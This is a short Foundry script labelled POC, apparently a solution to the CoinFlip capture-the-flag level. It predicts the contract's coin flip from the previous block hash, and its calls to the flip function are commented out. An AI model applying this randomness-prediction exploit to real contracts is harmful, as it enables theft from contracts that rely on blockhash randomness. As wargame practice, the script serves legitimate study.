// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel03.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract POC is Script {
    using SafeMath for uint256;

    CoinFlip level3 = CoinFlip(0x0489a452B2066336912dA5e9d4B40f0D38b6DDDe);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        //vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        console.log("Consecutive Wins: ", block.number);
        console.log("Consecutive Wins: ", level3.consecutiveWins());
        //if (side) {
        //    level3.flip(true); 
        //} else {
        //    level3.flip(false);
        //}

        console.log("Consecutive Wins: ", level3.consecutiveWins());
        //vm.stopBroadcast();
    }
}

